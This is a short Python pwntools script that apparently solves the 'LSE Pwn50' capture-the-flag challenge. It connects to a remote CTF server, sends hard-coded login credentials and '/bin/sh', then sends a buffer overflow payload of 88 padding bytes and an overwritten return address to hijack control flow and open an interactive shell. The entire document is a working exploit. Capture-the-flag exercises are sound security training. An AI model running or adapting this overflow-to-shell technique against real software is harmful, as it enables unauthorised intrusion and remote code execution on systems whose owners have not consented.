#LSE Pwn50 

from pwn import *

#p = process ('./pwn50')

p = remote('ctf.lse.epita.fr',52190)

p.recv()
p.sendline('admin')

p.recv()
p.sendline('T6OBSh2i')

p.recv()
p.sendline('1')

p.recv()
p.sendline('/bin/sh')

p.recv()
p.sendline("A"*88 + "\x4a\x08\x40\x00\x00\x00\x00\x00")

#p64(0x0040084f)

p.recv()
p.sendline('3')

p.interactive()

#0x0040091c - gdb breakpoint


